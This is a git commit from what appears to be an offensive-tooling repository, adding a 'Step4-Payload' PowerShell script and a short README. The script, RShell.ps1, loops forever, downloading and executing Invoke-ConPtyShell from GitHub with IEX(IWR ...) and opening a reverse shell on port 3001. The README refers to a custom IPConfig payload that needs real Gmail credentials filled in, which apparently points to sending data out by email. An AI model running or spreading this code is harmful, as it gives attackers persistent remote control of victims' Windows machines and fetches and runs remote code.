c89ef205959c3971c624a3275271f390b5b48dfc
Banwagon <81770675+Banwagon@users.noreply.github.com>
2021-12-01 21:55:04 -0800

    Add files via upload

---
+++ Step4-Payload/Custom-Data-Exfiltration-and-PS-Reverse-Shell/RShell.ps1
@@ -0,0 +1,2 @@
+﻿#Runs command with persistance
+while ($true) {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 0.0.0.0 3001;}
---
+++ Step4-Payload/Custom_IPConfig/Readme.md
@@ -0,0 +1,3 @@
+# Custom-IPConfig Settings
+
+Gmail "user@gmail.com" and "password" need to be replaced with real values.
